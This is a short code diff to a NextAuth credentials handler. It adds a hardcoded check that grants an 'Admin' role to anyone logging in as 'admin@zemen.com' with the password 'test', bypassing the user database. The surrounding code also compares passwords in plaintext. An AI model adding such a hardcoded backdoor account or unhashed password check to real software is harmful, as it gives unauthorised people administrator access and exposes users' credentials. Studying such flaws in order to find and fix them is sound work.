@@ -16,6 +16,11 @@ const handler = NextAuth({
             return null;
         }
 
+        // Hardcoded check for the special admin user
+        if (credentials.email === 'admin@zemen.com' && credentials.password === 'test') {
+            return { id: 'user_ck_admin_001', name: 'Admin User', email: 'admin@zemen.com', role: 'Admin' };
+        }
+
         const user = db.prepare('SELECT * FROM users WHERE email = ?').get(credentials.email);
 
         if (user && user.password === credentials.password) {
